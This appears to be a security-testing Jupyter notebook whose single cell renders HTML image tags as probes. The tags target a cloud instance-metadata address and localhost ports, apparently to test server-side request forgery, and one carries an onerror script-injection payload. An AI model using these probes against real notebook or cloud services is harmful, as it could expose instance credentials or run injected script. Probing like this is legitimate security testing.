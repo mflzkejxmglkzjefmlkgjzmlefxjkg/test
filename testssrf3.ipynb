{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "test.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyPh9SJP19vIjIHIiEPmAe+v",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/mflzkejxmglkzjefmlkgjzmlefxjkg/test/blob/master/testssrf3.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6YbH8k5IJ1s_",
        "colab_type": "code",
        "outputId": "16695304-c975-454a-919e-6c3224346a1c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 36
        }
      },
      "source": [
        "from IPython.core.display import display, HTML\n",
        "\n",
        "display(HTML('''\n",
        "\n",
        "<img src=\"http://169.254.169.254/user-data\"></img>\n",
        "<img src=\"http://127.0.0.1?\\\"%20onerror=\\\"alert(2)\\\"\"></img>\n",
        "<img src=\"http://127.0.0.1:8080\"></img>\n",
        "<img src=\"https://127.0.0.1:443\"></img>\n",
        "'''))"
      ],
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "\n",
              "\n",
              "<img src=\"http://169.254.169.254/user-data\"></img>\n",
              "<img src=\"http://127.0.0.1?\"%20onerror=\"alert(2)\"\"></img>\n",
              "<img src=\"http://127.0.0.1:8080\"></img>\n",
              "<img src=\"https://127.0.0.1:443\"></img>\n"
            ],
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    }
  ]
}